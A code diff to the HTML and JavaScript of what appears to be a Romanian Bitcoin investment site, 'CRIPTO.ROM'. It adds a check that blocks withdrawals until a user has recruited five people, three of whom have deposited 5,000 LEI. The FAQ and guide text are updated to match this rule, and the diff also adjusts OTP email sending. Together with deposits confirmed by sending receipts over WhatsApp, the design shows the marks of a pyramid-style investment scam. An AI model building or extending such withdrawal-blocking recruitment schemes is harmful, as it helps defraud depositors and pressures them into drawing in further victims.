@@ -21,25 +21,96 @@
       const EMAILJS_PUBLIC_KEY  = 'hcuSHZHblr2JrQcHm';
       const EMAILJS_SERVICE_ID  = 'service_ljvjw85';
       const EMAILJS_TEMPLATE_ID = 'template_nhwkoxg';
-      function _initEmailJS() {
-        if (typeof emailjs !== 'undefined') { 
-            try { emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY }); } catch(e) { console.error(e); }
-        }
-        else { setTimeout(_initEmailJS, 200); }
-      }
-      _initEmailJS();
-      window.sendOTPEmail = async function(toEmail, toName, otpCode) {
-        try {
-          if (typeof emailjs === 'undefined') { 
-            await new Promise(r => setTimeout(r, 1500)); 
-            _initEmailJS(); 
+
+      // ===== IMPROVED EMAILJS INITIALIZATION =====
+      (function initEmailJS() {
+          if (typeof emailjs !== 'undefined' && emailjs.init) {
+              try {
+                  emailjs.init({
+                      publicKey: EMAILJS_PUBLIC_KEY,
+                      blockHeadless: false,
+                      blockList: { watch: false, enabled: false },
+                      limit: 10
+                  });
+                  console.log('[EmailJS] Initialized successfully with key:', EMAILJS_PUBLIC_KEY);
+                  window._emailjsInitialized = true;
+              } catch(e) {
+                  console.error('[EmailJS] Init error:', e);
+                  setTimeout(initEmailJS, 500);
+              }
+          } else {
+              setTimeout(initEmailJS, 100);
           }
-          if (typeof emailjs === 'undefined') throw new Error("EmailJS not loaded");
-          
-          const templateParams = { to_email: toEmail, to_name: toName, otp_code: otpCode, email: toEmail, name: toName, code: otpCode, message: otpCode, from_name: 'CRIPTO.ROM', subject: 'Cod verificare CRIPTO.ROM: ' + otpCode };
-          await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
-          return true;
-        } catch(e) { console.error('[EmailJS] Send failed:', e); return false; }
+      })();
+
+      // ===== IMPROVED SEND OTP EMAIL FUNCTION =====
+      window.sendOTPEmail = async function(toEmail, toName, otpCode) {
+          try {
+              // Wait for EmailJS SDK to be available
+              if (typeof emailjs === 'undefined') {
+                  console.log('[EmailJS] Waiting for SDK to load...');
+                  let waitCount = 0;
+                  while (typeof emailjs === 'undefined' && waitCount < 50) {
+                      await new Promise(r => setTimeout(r, 200));
+                      waitCount++;
+                  }
+              }
+
+              if (typeof emailjs === 'undefined') {
+                  throw new Error("EmailJS SDK not loaded after waiting");
+              }
+
+              // Re-initialize if not done yet
+              if (!window._emailjsInitialized) {
+                  try {
+                      emailjs.init({
+                          publicKey: EMAILJS_PUBLIC_KEY,
+                          blockHeadless: false,
+                          blockList: { watch: false, enabled: false }
+                      });
+                      window._emailjsInitialized = true;
+                      console.log('[EmailJS] Re-initialized successfully');
+                  } catch(e) {
+                      console.error('[EmailJS] Re-init failed:', e);
+                  }
+              }
+
+              // Prepare template parameters with ALL possible variable name variations
+              const templateParams = {
+                  to_email: toEmail,
+                  to_name: toName,
+                  otp_code: otpCode,
+                  email: toEmail,
+                  name: toName,
+                  code: otpCode,
+                  message: 'Codul tau de verificare CRIPTO.ROM este: ' + otpCode,
+                  from_name: 'CRIPTO.ROM',
+                  from_email: 'contact.cripto.rom@gmail.com',
+                  reply_to: 'contact.cripto.rom@gmail.com',
+                  subject: 'Cod verificare CRIPTO.ROM: ' + otpCode,
+                  user_email: toEmail,
+                  user_name: toName,
+                  verification_code: otpCode,
+                  otp: otpCode,
+                  passcode: otpCode,
+                  token: otpCode,
+                  pin: otpCode
+              };
+
+              console.log('[EmailJS] Sending email to:', toEmail, 'Service:', EMAILJS_SERVICE_ID, 'Template:', EMAILJS_TEMPLATE_ID);
+
+              const response = await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
+
+              console.log('[EmailJS] Send SUCCESS! Status:', response.status, 'Text:', response.text);
+              return true;
+          } catch(e) {
+              console.error('[EmailJS] Send FAILED:', e);
+              console.error('[EmailJS] Error name:', e.name);
+              console.error('[EmailJS] Error message:', e.message);
+              if (e.status) console.error('[EmailJS] Error status:', e.status);
+              if (e.text) console.error('[EmailJS] Error text:', e.text);
+              return false;
+          }
       };
     </script>
     <style>
@@ -473,6 +544,16 @@
         .guide-warning-box ol { padding-left: 18px; }
         .guide-warning-box ol li { font-size: 12px; color: var(--text-gray); margin-bottom: 4px; }
 
+        /* ===== WITHDRAWAL ELIGIBILITY MODAL ===== */
+        .eligibility-stat-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
+        .eligibility-stat-label { font-size: 13px; color: var(--text-gray); display: flex; align-items: center; gap: 8px; font-weight: 500; }
+        .eligibility-stat-value { font-size: 14px; font-weight: 800; color: var(--text-primary); display: flex; align-items: center; gap: 4px; }
+        .eligibility-check-icon { display: inline-flex; align-items: center; justify-content: center; width: 18px; height: 18px; border-radius: 50%; font-size: 9px; margin-left: 4px; }
+        .eligibility-check-icon.ok { background: var(--green); color: #fff; }
+        .eligibility-check-icon.not { background: rgba(220,38,38,0.15); color: var(--red); }
+        .eligibility-progress-bar { width: 100%; height: 8px; background: var(--border-color); border-radius: 4px; overflow: hidden; margin-bottom: 4px; }
+        .eligibility-progress-fill { height: 100%; border-radius: 4px; transition: width 0.6s ease; min-width: 2px; }
+
         /* ===== RESPONSIVE DESIGN FOR MOBILE ===== */
         @media (max-width: 768px) {
             .nav-links { display: none; }
@@ -867,8 +948,8 @@
                 <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cum deschid un cont?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Apasă pe "Cont Nou", alege tipul de cont, completează datele personale și codul de referral al persoanei care te-a invitat. Codul de referral este obligatoriu pentru creare cont.</div></div>
                 <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Care este suma minimă de investiție?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Suma minimă de investiție este 5.000 LEI echivalent în Bitcoin. Aceasta este suma necesară pentru a fi eligibil să câștigi profit lunar.</div></div>
                 <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cum depun fonduri?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Apasă "Depozit" în dashboard, apoi "Generează". Se va genera o adresă Bitcoin și un QR code. Scanează QR-ul cu portofelul Bitcoin din telefonul tău sau mergi la cel mai apropiat Bitcoin ATM pentru a depune. După ce faci depozitul, fă o poză a chitanței și apasă "Am Plătit" pentru a o trimite pe WhatsApp.</div></div>
-                <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cum funcționează retragerea?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Apasă "Retragere" în dashboard, completează numele complet, ID-ul contului, adresa Bitcoin și suma. Vei fi redirecționat automat către WhatsApp-ul nostru cu detaliile completate. Echipa noastră va transfera fondurile în contul tău Bitcoin.</div></div>
-                <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cum funcționează sistemul de referral?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Fiecare utilizator primește un cod de referral unic la creare cont. Trebuie să inviți 5 persoane, din care cel puțin 3 trebuie să investească într-o lună. Codul de referral este obligatoriu la înregistrare. Când cineva se înregistrează cu codul tău, contorul "Persoane Invitate" crește automat.</div></div>
+                <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cum funcționează retragerea?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Apasă "Retragere" în dashboard, completează numele complet, ID-ul contului, adresa Bitcoin și suma. Sistemul va verifica mai întâi dacă ai invitat 5 persoane și dacă cel puțin 3 dintre ele au investit 5.000 LEI. Dacă îndeplinești criteriile, vei fi redirecționat către WhatsApp-ul nostru cu detaliile completate.</div></div>
+                <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cum funcționează sistemul de referral?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Fiecare utilizator primește un cod de referral unic la creare cont. Trebuie să inviți 5 persoane, din care cel puțin 3 trebuie să investească într-o lună. Codul de referral este obligatoriu la înregistrare. Când cineva se înregistrează cu codul tău, contorul "Persoane Invitate" crește automat. Pentru a putea retrage bani, trebuie să fi invitat minimum 5 persoane din care 3 să fi investit 5.000 LEI.</div></div>
                 <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cât durează până se reflectă depozitul?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">După ce apeși "Am Plătit" și trimiți chitanța pe WhatsApp, depozitul apare ca pendinte (galben). Echipa noastră verifică plata și confirmă depozitul în contul tău în cel mai scurt timp.</div></div>
                 <div class="faq-item" onclick="toggleFaq(this)"><div class="faq-q"><h4>Cum contactez suportul?</h4><i class="fas fa-chevron-down"></i></div><div class="faq-ans">Ne poți contacta prin WhatsApp la +40774534930 sau prin email la contact.cripto.rom@gmail.com. Suportul este disponibil 24/7.</div></div>
             </div>
@@ -1463,7 +1544,8 @@
                 <li>Apasă "Retragere" în dashboard</li>
                 <li>Completează numele complet, ID-ul contului și adresa Bitcoin</li>
                 <li>Introdu suma de retragere</li>
-                <li>Vei fi redirecționat automat către WhatsApp</li>
+                <li>Sistemul va verifica dacă ai invitat 5 persoane și 3 au investit</li>
+                <li>Dacă ești eligibil, vei fi redirecționat către WhatsApp</li>
                 <li>Trimite mesajul WhatsApp cu detaliile completate</li>
                 <li>Echipa noastră de suport va transfera banii în contul tău BTC</li>
             </ul>
@@ -1496,6 +1578,23 @@
         </div>
         <button class="tron-btn tron-btn-primary" style="width:100%;padding:12px;margin-bottom:8px;" onclick="toggleModal('insufficientFundsMod');showDepositPage();"><i class="fas fa-plus"></i> Depune Fonduri</button>
         <button class="tron-btn tron-btn-outline" style="width:100%;padding:12px;color:var(--text-gray);border-color:var(--border-color);" onclick="toggleModal('insufficientFundsMod')">Închide</button>
+    </div>
+</div>
+
+<!-- ===== NEW: WITHDRAWAL ELIGIBILITY MODAL ===== -->
+<div class="modal" id="withdrawalEligibilityMod">
+    <div class="modal-content" style="text-align:center;max-width:420px;">
+        <button class="modal-close" onclick="toggleModal('withdrawalEligibilityMod')"><i class="fas fa-times"></i></button>
+        <div class="popup-icon-circle warning" id="eligibilityIconCircle"><i class="fas fa-users-slash"></i></div>
+        <h3 class="popup-title" id="eligibilityTitle">Criterii de Retragere</h3>
+        <p class="popup-msg" id="eligibilityMsg">Pentru a putea retrage, trebuie să îndeplinești criteriile de referral.</p>
+        <div class="popup-info-box" id="eligibilityStats" style="text-align:left;"></div>
+        <div style="background:rgba(247,147,26,0.08);border:1px solid rgba(247,147,26,0.3);border-radius:8px;padding:12px;margin-bottom:14px;text-align:left;">
+            <p style="font-size:11px;color:var(--btc-orange);font-weight:700;margin-bottom:4px;"><i class="fas fa-info-circle"></i> Criterii de retragere:</p>
+            <p style="font-size:11px;color:var(--text-gray);line-height:1.6;margin-bottom:2px;">• Minim 5 persoane invitate cu codul tău</p>
+            <p style="font-size:11px;color:var(--text-gray);line-height:1.6;">• Minim 3 dintre ele să fi investit 5.000 LEI</p>
+        </div>
+        <button class="tron-btn tron-btn-primary" style="width:100%;padding:12px;" onclick="toggleModal('withdrawalEligibilityMod')">Am Înțeles</button>
     </div>
 </div>
 
@@ -1551,7 +1650,7 @@
         <input class="tf-input" type="number" id="tAmount" placeholder="0.00">
         <button class="tron-btn tron-btn-primary" style="width:100%;padding:14px;margin-top:8px;" onclick="doTransfer()"><i class="fas fa-paper-plane"></i> Confirmă Retragerea</button>
         <div style="background:rgba(247,147,26,0.08);border:1px solid rgba(247,147,26,0.3);border-radius:8px;padding:12px;margin-top:14px;">
-            <p style="font-size:11px;color:var(--text-gray);line-height:1.6;"><i class="fas fa-info-circle" style="color:var(--btc-orange);"></i> După confirmare, vei fi redirecționat către WhatsApp cu detaliile completate. Trimite mesajul și echipa noastră va transfera fondurile în contul tău Bitcoin.</p>
+            <p style="font-size:11px;color:var(--text-gray);line-height:1.6;"><i class="fas fa-info-circle" style="color:var(--btc-orange);"></i> Înainte de confirmare, sistemul va verifica dacă ai invitat minimum 5 persoane și dacă 3 dintre ele au investit 5.000 LEI. După confirmare, vei fi redirecționat către WhatsApp cu detaliile completate.</p>
         </div>
     </div>
 </div>
@@ -2037,17 +2136,14 @@
             await runTransaction(countRef, (currentCount) => {
                 return (currentCount || 0) + 1;
             });
-            console.log('[REFERRAL] Count incremented via transaction for:', referrerUID);
             return true;
         } catch(e) {
-            console.error('[REFERRAL] Transaction failed, trying fallback:', e);
             try {
                 const referrerSnap = await get(ref(db, `users/${referrerUID}`));
                 if (referrerSnap.exists()) {
                     const referrerData = referrerSnap.val();
                     const newCount = (referrerData.referralCount || 0) + 1;
                     await update(ref(db, `users/${referrerUID}`), { referralCount: newCount });
-                    console.log('[REFERRAL] Count incremented via fallback for:', referrerUID);
                     return true;
                 }
             } catch(e2) {
@@ -2057,7 +2153,6 @@
                 const referrerSnap = await get(ref(db, `users/${referrerUID}/referralCount`));
                 const currentVal = referrerSnap.exists() ? (referrerSnap.val() || 0) : 0;
                 await set(ref(db, `users/${referrerUID}/referralCount`), currentVal + 1);
-                console.log('[REFERRAL] Count incremented via set for:', referrerUID);
                 return true;
             } catch(e3) {
                 console.error('[REFERRAL] All increment methods failed:', e3);
@@ -2089,9 +2184,6 @@
             referrerUID = 'ADMIN';
         } else {
             referrerUID = await lookupReferralCode(referralCodeInput);
-            if (!referrerUID) {
-                console.warn('[REFERRAL] Could not validate referral code before auth. Will retry after.');
-            }
         }
         
         toggleModal('regMod');
@@ -2123,22 +2215,11 @@
             }
             
             if (!referrerUID && referralCodeInput !== ADMIN_REFERRAL_CODE) {
-                console.log('[REFERRAL] Retrying referral code lookup after auth...');
                 referrerUID = await lookupReferralCode(referralCodeInput);
             }
             
             if (referrerUID && referrerUID !== 'ADMIN') {
-                console.log('[REFERRAL] Incrementing count for referrer:', referrerUID);
                 const success = await incrementReferralCount(referrerUID);
-                if (success) {
-                    console.log('[REFERRAL] Successfully incremented referral count for:', referrerUID);
-                } else {
-                    console.error('[REFERRAL] Failed to increment referral count for:', referrerUID);
-                }
-            } else if (referrerUID === 'ADMIN') {
-                console.log('[REFERRAL] Referred by ADMIN, no count to increment.');
-            } else {
-                console.warn('[REFERRAL] No referrer found for code:', referralCodeInput);
             }
             
             hideSpinner();
@@ -2232,6 +2313,152 @@
     }
     window.nextGuideStep = (step) => { guideStepCurrent = step; showGuideStep(step); };
 
+    // ===== ===== WITHDRAWAL ELIGIBILITY CHECK ===== =====
+    // This function checks if the user has referred 5 people and 3 of them have deposited 5000 LEI
+    async function checkWithdrawalEligibility() {
+        if (!currentUserData || !currentUserData.referralCode) {
+            return { eligible: false, reason: 'no_code', totalReferrals: 0, fundedReferrals: 0, remaining: 5 };
+        }
+        
+        const userReferralCode = currentUserData.referralCode.toUpperCase();
+        
+        // Get all users from Firebase
+        const usersSnap = await get(ref(db, 'users'));
+        if (!usersSnap.exists()) {
+            return { eligible: false, reason: 'no_referrals', totalReferrals: 0, fundedReferrals: 0, remaining: 5 };
+        }
+        
+        // Find all users referred by this user's referral code
+        let referredUsers = [];
+        usersSnap.forEach(childSnap => {
+            const u = childSnap.val();
+            if (u.referredBy && u.referredBy.toUpperCase() === userReferralCode) {
+                referredUsers.push({ uid: childSnap.key, ...u });
+            }
+        });
+        
+        const totalReferrals = referredUsers.length;
+        
+        if (totalReferrals === 0) {
+            return { eligible: false, reason: 'no_referrals', totalReferrals: 0, fundedReferrals: 0, remaining: 5 };
+        }
+        
+        // Check how many of the referred users have deposited 5000 LEI
+        let fundedReferrals = 0;
+        for (const referredUser of referredUsers) {
+            let hasFunded = false;
+            
+            // Check if balance >= 5000
+            if (referredUser.balance && Number(referredUser.balance) >= 5000) {
+                hasFunded = true;
+            }
+            
+            // If balance check failed, check transactions for deposits
+            if (!hasFunded && referredUser.uid) {
+                try {
+                    const txSnap = await get(ref(db, `users/${referredUser.uid}/transactions`));
+                    if (txSnap.exists()) {
+                        const txs = txSnap.val();
+                        Object.values(txs).forEach(tx => {
+                            if (tx.type === 'DEPOSIT' && Number(tx.amount) >= 5000 && (tx.status === 'SUCCESS' || tx.status === 'PENDING')) {
+                                hasFunded = true;
+                            }
+                        });
+                    }
+                } catch(e) {
+                    console.warn('Could not check transactions for referred user:', referredUser.uid);
+                }
+            }
+            
+            if (hasFunded) fundedReferrals++;
+        }
+        
+        // Check both conditions: need 5 referrals AND 3 funded
+        if (totalReferrals < 5) {
+            return { 
+                eligible: false, 
+                reason: 'not_enough_referrals', 
+                totalReferrals, 
+                fundedReferrals, 
+                remaining: 5 - totalReferrals 
+            };
+        }
+        
+        if (fundedReferrals < 3) {
+            return { 
+                eligible: false, 
+                reason: 'not_enough_funded', 
+                totalReferrals, 
+                fundedReferrals, 
+                remainingFunded: 3 - fundedReferrals 
+            };
+        }
+        
+        return { eligible: true, totalReferrals, fundedReferrals };
+    }
+
+    // ===== SHOW ELIGIBILITY MODAL =====
+    window.showEligibilityModal = function(eligibility) {
+        const titleEl = document.getElementById('eligibilityTitle');
+        const msgEl = document.getElementById('eligibilityMsg');
+        const statsEl = document.getElementById('eligibilityStats');
+        const iconEl = document.getElementById('eligibilityIconCircle');
+        
+        if (eligibility.reason === 'no_referrals') {
+            iconEl.className = 'popup-icon-circle warning';
+            iconEl.innerHTML = '<i class="fas fa-users-slash"></i>';
+            titleEl.innerText = '0 Invitații';
+            msgEl.innerText = 'Nu ai invitat încă nicio persoană. Te rugăm să inviți cel puțin 5 persoane folosind codul tău de referral, iar 3 dintre ele trebuie să investească 5.000 LEI pentru a putea retrage.';
+        } else if (eligibility.reason === 'not_enough_referrals') {
+            iconEl.className = 'popup-icon-circle warning';
+            iconEl.innerHTML = '<i class="fas fa-user-plus"></i>';
+            titleEl.innerText = 'Mai Ai Nevoie de Invitații';
+            msgEl.innerText = `Ai invitat ${eligibility.totalReferrals} persoană/persoane din 5 necesare. Te rugăm să mai inviți ${eligibility.remaining} persoană/persoane pentru a îndeplini criteriile de retragere.`;
+        } else if (eligibility.reason === 'not_enough_funded') {
+            iconEl.className = 'popup-icon-circle warning';
+            iconEl.innerHTML = '<i class="fas fa-coins"></i>';
+            titleEl.innerText = 'Invitații Fără Investiție';
+            msgEl.innerText = `Ai invitat ${eligibility.totalReferrals} persoane, dar doar ${eligibility.fundedReferrals} din ele au investit 5.000 LEI. Ai nevoie de cel puțin 3 invitați care să fi investit pentru a putea retrage. ${eligibility.remainingFunded} dintre invitații tăi nu au încă finanțat contul.`;
+        }
+        
+        // Show progress stats
+        const referralProgress = Math.min(100, (eligibility.totalReferrals / 5) * 100);
+        const fundedProgress = Math.min(100, (eligibility.fundedReferrals / 3) * 100);
+        const referralMet = eligibility.totalReferrals >= 5;
+        const fundedMet = eligibility.fundedReferrals >= 3;
+        
+        statsEl.innerHTML = `
+            <div class="eligibility-stat-row">
+                <div class="eligibility-stat-label">
+                    <i class="fas fa-users" style="color:var(--btc-orange);"></i>
+                    Persoane Invitate
+                </div>
+                <div class="eligibility-stat-value">
+                    ${eligibility.totalReferrals} / 5
+                    <span class="eligibility-check-icon ${referralMet ? 'ok' : 'not'}"><i class="fas fa-${referralMet ? 'check' : 'times'}"></i></span>
+                </div>
+            </div>
+            <div class="eligibility-progress-bar">
+                <div class="eligibility-progress-fill" style="width:${referralProgress}%; background:${referralMet ? 'var(--green)' : 'var(--btc-orange)'};"></div>
+            </div>
+            <div class="eligibility-stat-row" style="margin-top:14px;">
+                <div class="eligibility-stat-label">
+                    <i class="fas fa-coins" style="color:var(--btc-orange);"></i>
+                    Invitați Care Au Investit
+                </div>
+                <div class="eligibility-stat-value">
+                    ${eligibility.fundedReferrals} / 3
+                    <span class="eligibility-check-icon ${fundedMet ? 'ok' : 'not'}"><i class="fas fa-${fundedMet ? 'check' : 'times'}"></i></span>
+                </div>
+            </div>
+            <div class="eligibility-progress-bar">
+                <div class="eligibility-progress-fill" style="width:${fundedProgress}%; background:${fundedMet ? 'var(--green)' : 'var(--btc-orange)'};"></div>
+            </div>
+        `;
+        
+        toggleModal('withdrawalEligibilityMod');
+    };
+
     // ===== WITHDRAW / TRANSFER (WHATSAPP REDIRECT) =====
     window.showTransferPage = () => { document.getElementById('transferPage').style.display = 'block'; document.getElementById('transferPage').scrollTop = 0; };
     window.hideTransferPage = () => {
@@ -2239,7 +2466,8 @@
         ['tRecipient','tAccId','tBtcAddress','tAmount'].forEach(id => { const el = document.getElementById(id); if(el) el.value=''; });
     };
 
-    window.doTransfer = () => {
+    // ===== MODIFIED doTransfer WITH ELIGIBILITY CHECK =====
+    window.doTransfer = async () => {
         const data = currentUserData;
         const recipient = document.getElementById('tRecipient').value.trim();
         const accId = document.getElementById('tAccId').value.trim();
@@ -2258,6 +2486,17 @@
             toggleModal('insufficientFundsMod'); return;
         }
         
+        // ===== REFERRAL ELIGIBILITY CHECK =====
+        showSpinner('SE VERIFICĂ ELIGIBILITATEA RETRAGERII...');
+        const eligibility = await checkWithdrawalEligibility();
+        hideSpinner();
+        
+        if (!eligibility.eligible) {
+            showEligibilityModal(eligibility);
+            return;
+        }
+        
+        // ===== PROCEED WITH WITHDRAWAL IF ELIGIBLE =====
         const whatsappMessage = `*CERERE RETRAGERE CRIPTO.ROM*%0A%0A` +
             `*Nume Complet:* ${recipient}%0A` +
             `*ID Cont:* ${accId}%0A` +
@@ -2307,7 +2546,7 @@
     };
 
     window.copyBtcAddress = () => {
-        if (currentBtcAddress) {
+         if (currentBtcAddress) {
             navigator.clipboard.writeText(currentBtcAddress).then(() => {
                 showSuccessToast('Copiat', 'Adresa Bitcoin a fost copiată.');
             });
